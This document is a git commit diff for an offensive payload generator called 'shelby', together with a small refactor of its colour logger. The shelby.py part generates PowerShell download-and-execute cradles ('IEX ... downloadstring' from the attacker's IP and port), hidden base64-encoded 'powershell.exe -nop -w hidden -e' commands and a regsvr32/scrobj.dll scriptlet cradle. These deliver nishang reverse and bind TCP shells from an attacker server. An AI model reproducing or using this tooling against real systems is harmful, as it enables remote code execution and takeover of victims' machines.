0fe9d7543629612dfe1d4521717d723ebfde2995
mez0 <mez0@pm.me>
2020-01-29 19:37:39 +0000

    fucking fixed the bastard

--- lib/logger.py
+++ lib/logger.py
@@ -1,3 +1,4 @@
+import os, math
 from time import gmtime, strftime
 
 # Colours
@@ -15,38 +16,155 @@ colour_yellow_bold = "\033[1;33m"
 
 colour_remove= "\033[0m"
 
+# Switches
+colour_status = True
+
 def green_fg(string):
 	string=str(string)
-	print(colour_green_fg + string + colour_remove)
+	if colour_status:
+		return (colour_green_fg + string + colour_remove)
+	else:
+		return string
 
 def green_bold(string):
 	string=str(string)
-	print(colour_green_bold + string + colour_remove)
+	if colour_status:
+		return (colour_green_bold + string + colour_remove)
+	else:
+		return string
 
 def green_bg(string):
 	string=str(string)
-	print(colour_green_bg + string + colour_remove)
+	if colour_status:
+		return (colour_green_bg + string + colour_remove)
+	else:
+		return string
 
 def red_fg(string):
 	string=str(string)
-	print(colour_red_fg + ">> " + string + colour_remove)
+	if colour_status:
+		return (colour_red_fg + string + colour_remove)
+	else:
+		return string
 
 def red_bold(string):
 	string=str(string)
-	print(colour_red_bold + string + colour_remove)
+	if colour_status:
+		return (colour_red_bold + string + colour_remove)
+	else:
+		return string
 
 def red_bg(string):
 	string=str(string)
-	print(colour_red_bg + string + colour_remove)
+	if colour_status:
+		return (colour_red_bg + string + colour_remove)
+	else:
+		return string
 
 def yellow_fg(string):
 	string=str(string)
-	print(colour_yellow_fg + string + colour_remove)
+	if colour_status:
+		return (colour_yellow_fg + string + colour_remove)
+	else:
+		return string
 
 def yellow_bold(string):
 	string=str(string)
-	print(colour_yellow_bold + string + colour_remove)
+	if colour_status:
+		return (colour_yellow_bold + string + colour_remove)
+	else:
+		return string
 
 def yellow_bg(string):
 	string=str(string)
-	print(colour_yellow_bg + string + colour_remove)
+	if colour_status:
+		return (colour_yellow_bg + string + colour_remove)
+	else:
+		return string
+
+class green:
+	def __init__(self,string):
+		self.string = string
+
+	def fg(string):
+		log_time=strftime("%d/%m/%y, %H:%M:%S", gmtime())
+		print(green_fg(string))
+
+	def bg(string):
+		log_time=strftime("%d/%m/%y, %H:%M:%S", gmtime())
+		print(green_bg(string))
+
+	def bold(string):
+		log_time=strftime("%d/%m/%y, %H:%M:%S", gmtime())
+		print(green_bold(string))
+
+	def heading(string):
+		print(green_bold(string))
+
+	def bullet(string):
+		b = ' -'
+		print('%s\t%s' % (green_fg(b),string))
+
+class red:
+	def __init__(self,string):
+		self.string = string
+
+	def fg(string):
+		log_time=strftime("%d/%m/%y, %H:%M:%S", gmtime())
+		print(red_fg(string))
+
+	def bg(string):
+		log_time=strftime("%d/%m/%y, %H:%M:%S", gmtime())
+		print(red_bg(string))
+
+	def bold(string):
+		log_time=strftime("%d/%m/%y, %H:%M:%S", gmtime())
+		print(red_bold(string))
+
+	def heading(string):
+		print(red_bold(string))
+
+	def bullet(string):
+		b = ' -'
+		print('%s\t%s' % (red_fg(b),string))
+
+class yellow:
+	def __init__(self,string):
+		self.string = string
+
+	def fg(string):
+		log_time=strftime("%d/%m/%y, %H:%M:%S", gmtime())
+		print(yellow_fg(string))
+
+	def bg(string):
+		log_time=strftime("%d/%m/%y, %H:%M:%S", gmtime())
+		print(yellow_bg(string))
+
+	def bold(string):
+		log_time=strftime("%d/%m/%y, %H:%M:%S", gmtime())
+		print(yellow_bold(string))
+
+	def heading(string):
+		print(yellow_bold(string))
+
+	def bullet(string):
+		b = ' -'
+		print('%s\t%s' % (yellow_fg(b),string))
+
+def banner(msg):
+	columns = os.get_terminal_size().columns # the length of the terminal
+	msg = 'Todo List' # the main banner string
+	title = (' ' * ((columns - len(msg))//2) + msg) # remove the length of the string from the available columns, then half it to get the middle
+	border_length = (' ' * ((columns - len(msg))) + msg) # do the same, just dont diivide it. this gives the entire length of the terminal
+	corner = '+'
+	dividers = '-' * (columns - len(corner)*2)
+	border = '%s%s%s' % (yellow_fg(corner),red_fg(dividers),yellow_fg(corner))
+	print(border)
+	print(yellow_fg(title))
+	print(border)
+
+class icons:
+	def check():
+		return u'\u2713'
+	def cross():
+		return u'\u2717'
--- shelby.py
+++ shelby.py
@@ -26,41 +26,85 @@ if args.directory != None:
 	else:
 		generated_payload_directory = args.directory + "/"
 else:
-	generated_payload_directory = "./generated_payloads/"
+	generated_payload_directory = "./web_delivery/"
 
 logger.red_fg("The attacker server is set to %s:%s"  % (ipaddr, port))
 logger.red_fg("Writing payloads to %s" % generated_payload_directory)
 print()
 
+resource_directory = './resources/'
+cradle_commands_file = generated_payload_directory+'cradle_commands.txt'
 shell_dictionary = {}
+cradle_dictionary = {}
 
-def register_shell(filename, shellcontent):
-	shellname = randomString()
-	shell_dictionary[filename] = shellname
-	set_resource(filename, shellcontent)
+
+def banner(msg):
+	columns = os.get_terminal_size().columns # the length of the terminal
+	title = (' ' * ((columns - len(msg))//2) + msg) # remove the length of the string from the available columns, then half it to get the middle
+	border_length = (' ' * ((columns - len(msg))) + msg) # do the same, just dont diivide it. this gives the entire length of the terminal
+	corner = '+'
+	dividers = '-' * (columns - len(corner)*2)
+	border = '%s%s%s' % (logger.yellow_fg(corner),logger.red_fg(dividers),logger.yellow_fg(corner))
+	print(border)
+	print(logger.yellow_fg(title))
+	print(border)
+
+def randomString(length=6):
+	return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
+
+def add_cradle_call_command(cradle_name,execution_cradle_command):
+	with open(cradle_commands_file,'a') as filecontents:
+		filecontents.write('%s:\n' % cradle_name)
+		filecontents.write(execution_cradle_command+'\n')
+		filecontents.write('\n')
 
 def print_shell_dictionary():
-	print()
-	logger.red_fg("The following payloads were generated:")
-	for key, value in shell_dictionary.items():
-		print("Shell %s, named %s" % (key, value))
+	print("The following payloads were generated:")
+	for shell_name, location in shell_dictionary.items():
+		print("%s: %s%s" % (logger.yellow_fg(shell_name), generated_payload_directory,logger.yellow_fg(location)))
 
-# A base shell to pull
-def nishang_powershell():
-	nishang_shell = get_resource("resources/Invoke-PowerShellTcp.ps1")
-	register_shell("Invoke-PowerShellTcp.ps1", nishang_shell)
+def print_cradle_dictionary():
+	print("The following payloads were generated:")
+	for shell_name, cradles in cradle_dictionary.items():
+			randomized_shell_name = cradles[0]
+			execution_cradle_command = cradles[1]
+			print(execution_cradle_command)
+
+def get_cradle(filename,payload,random_shell_name=randomString()):
+	with open(filename,'r') as filecontents:
+		resource_data = filecontents.read()
+		if 'RANDOMIZED_SHELL_NAME'  in resource_data:
+			resource_data = resource_data.replace('RANDOMIZED_SHELL_NAME',random_shell_name)
+		if 'RAW_DROPPER_BASE64' in resource_data:
+			resource_data = resource_data.replace('RAW_DROPPER_BASE64',payload)
+		return resource_data
+
+def set_cradle(filename, filecontents):
+	filename = filename
+	if not os.path.exists(generated_payload_directory):
+		os.mkdir(generated_payload_directory)
+	filename = generated_payload_directory + filename
+	destination_file = open(filename, "w")
+	destination_file.write(filecontents)
+	destination_file.close()
+
+def register_cradle(filename, shellcontent,execution_cradle_command):
+	random_shellname = 'THIS_IS_WHAT_REGSVR32WILLREQUEST.SCT'
+	cradle_dictionary[filename] = (random_shellname,execution_cradle_command)
+	set_cradle(random_shellname, shellcontent)
+	add_cradle_call_command(filename,execution_cradle_command)
 
 # Get a resource
 def get_resource(filename):
 	resource_data = ""
 	with open(filename, "r") as filecontents:
 		resource_data = filecontents.read()
-		resource_data = resource_data.replace(
-				"TEMPLATEIPADDRESS",
-				ipaddr
-				).replace(
-				"TEMPLATEPORT",
-				port)
+		if "TEMPLATEIPADDRESS" in resource_data:
+			resource_data = resource_data.replace("TEMPLATEIPADDRESS",ipaddr)
+		if "TEMPLATEPORT" in resource_data:
+			resource_data = resource_data.replace("TEMPLATEPORT",port)
+		if "RAW_DROPPER_BASE64" in resource_data:
+			resource_data = resource_data.replace("RAW_DROPPER_BASE64",raw_dropper_base64)
 	return resource_data
 
 # Write out a resource
@@ -73,6 +117,11 @@ def set_resource(filename, filecontents):
 	destination_file.write(filecontents)
 	destination_file.close()
 
+def register_shell(filename, shellcontent):
+	random_shellname = 'WHAT_THE_EXECUTION_CRADLE_WILL_FETCH_%s.ps1' % randomString()
+	shell_dictionary[filename] = random_shellname
+	set_resource(random_shellname, shellcontent)
+
 # The base command to pull files from the attackers machine to the victim machine
 def raw_dropper(filename):
 	base_payload="IEX (new-object system.net.webclient).downloadstring('http://%s:%s/%s')" % (ipaddr, port, filename)
@@ -83,18 +132,64 @@ def raw_dropper_base64(filename):
 	base64_base_payload = base64.b64encode(base_payload.encode('utf-16-le')).decode('utf-8')
 	return base64_base_payload
 	
-def manual_dropper():
-	logger.red_fg("This is your raw manual dropper")
-	logger.yellow_fg(raw_dropper("test"))
-	logger.red_fg("This is your raw manual dropper, base64-encoded")
-	logger.yellow_fg(raw_dropper_base64("test"))
-	logger.red_fg("This is the base payload")
-	logger.green_fg("powershell.exe -nop -w hidden -e %s" % raw_dropper_base64("Invoke-PowerShellTcp.ps1"))
-	
-def randomString(length=6):
-	return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
+def show_cradles(shell_name,randomized_shell_name):
+	banner(shell_name)
+	print(logger.green_fg("Raw PowerShell Execution Cradle"))
+	print(raw_dropper(randomized_shell_name))
+	print()
 
-nishang_powershell()
-raw_dropper_base64("test")
-manual_dropper()
+	print(logger.green_fg("Base64/UTF-16LE Encoded PowerShell Execution Cradle"))
+	print(raw_dropper_base64(randomized_shell_name))
+	print()
+
+	print(logger.green_fg("Full PowerShell Execution Cradle"))
+	logger.yellow.fg("powershell.exe -nop -w hidden -e %s" % raw_dropper_base64(randomized_shell_name))
+	print()
+
+# A base shell to pull
+def nishang_powershell_reverse():
+	shell_name = 'Invoke-PowerShellTcp.ps1'
+	shell_file = resource_directory+shell_name
+	nishang_shell = get_resource(shell_file) # obtains the actual src code for the shell
+	register_shell(shell_name, nishang_shell) # writes out the source code with a randomized name and adds the randomized name to a dict() 
+	show_cradles(shell_name,shell_dictionary[shell_name]) # shows the generated cradles, in case they are required for manual purposes. Additionally, this takes an 
+
+def nishang_powershell_bind():
+	shell_name = 'Invoke-PowerShellTcpOneLineBind.ps1'
+	shell_file = resource_directory+shell_name
+	nishang_shell = get_resource(shell_file) # obtains the actual src code for the shell
+	register_shell(shell_name, nishang_shell) # writes out the source code with a randomized name and adds the randomized name to a dict() 
+	show_cradles(shell_name,shell_dictionary[shell_name]) # shows the generated cradles, in case they are required for manual purposes. Additionally, this takes an 
+
+def regsvr32():
+	shell_name = 'Invoke-PowerShellTcp.ps1' # payload i want to execute
+	shell_file = resource_directory+shell_name # path to said payload
+	regsvr32_template_file = resource_directory+'regsvr32.xml'
+	# nishang_shell = get_resource(shell_file) # obtains the actual src code for the shell
+	# register_shell(shell_name, nishang_shell) # writes out the source code with a randomized name and adds the randomized name to a dict() 
+	b64_payload = raw_dropper_base64(shell_dictionary[shell_name]) # generates the UTF-16LE powershell IEX payload and encodes it into B64 and stores it
+	regsvr_cradle_scriptlet = get_cradle(regsvr32_template_file,b64_payload) # takes in the template cradle and the b64 payload
+	execution_cradle = 'regsvr32 /s /n /u /i:%s:%s:%s scrobj.dll' % (ipaddr,port,shell_dictionary[shell_name])
+	register_cradle('regsvr32', regsvr_cradle_scriptlet,execution_cradle) # filename, shellcontent,execution_cradle. 
+
+def cradles():
+	regsvr32()
+
+def shells():
+	nishang_powershell_reverse() # create and show 
+
+	nishang_powershell_bind() # create and show 
+
+
+banner('Shelby') # print the banner
+
+shells()
+cradles()
+
+banner('Shells')
+
 print_shell_dictionary()
+
+banner('Cradles')
+
+print_cradle_dictionary()
